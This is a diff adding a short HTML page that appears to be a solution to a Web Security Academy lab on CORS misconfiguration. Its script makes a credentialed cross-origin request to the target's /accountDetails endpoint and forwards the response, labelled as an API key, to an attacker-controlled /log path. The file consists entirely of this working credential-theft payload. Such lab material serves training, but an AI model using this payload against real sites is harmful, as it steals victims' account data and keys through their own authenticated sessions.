@@ -1,0 +1,16 @@
+<html>
+<body>
+	<script>
+		const xhr = new XMLHttpRequest();
+		const url = "https://xxxxxxxxxxxxxxURLxxxxxxxxxxxxxxx.web-security-academy.net";
+		xhr.onreadystatechange = () => {
+			if(xhr.readyState == XMLHttpRequest.DONE) {
+				fetch("/log?apiKey=" + xhr.responseText);
+			}
+		};
+		xhr.open('GET', url + '/accountDetails', true);
+		xhr.withCredentials = true;
+		xhr.send(null);
+	</script>
+</body>
+</html>
